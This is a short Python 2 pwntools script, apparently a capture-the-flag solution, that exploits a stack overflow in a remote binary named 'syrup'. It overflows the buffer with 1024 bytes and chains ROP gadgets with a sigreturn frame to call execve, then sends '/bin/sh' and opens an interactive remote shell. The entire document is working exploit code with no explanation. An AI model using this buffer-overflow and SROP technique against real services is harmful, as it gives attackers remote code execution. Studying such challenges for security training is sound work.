from pwn import *
context.clear(arch="amd64")
#p = process("./syrup")

p = remote("jh2i.com",50036)
fail = 0x402011
pop_rbp = 0x0000000000401011
first_rop = 0x40105d
payload = ""
payload += "A"*1024
payload += p64(0x6042)
payload += "A"*8
payload += p64(pop_rbp)
payload += p64(fail)
payload += p64(first_rop)
payload += p64(0x6042)
payload += p64(0)
payload += p64(0x401067)
payload += p64(0x6042)
payload += p64(0)
payload += p64(0x401004)
payload += p64(15)
frame = SigreturnFrame(kernel="amd64")
frame.rax = 59
frame.rdi = 0x402011
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x0000000000402000
frame.rip = 0x000000000040100f
payload += str(frame)
print len(payload)
p.sendline(payload)
pause()
p.sendline("/bin/sh\x00")
p.interactive()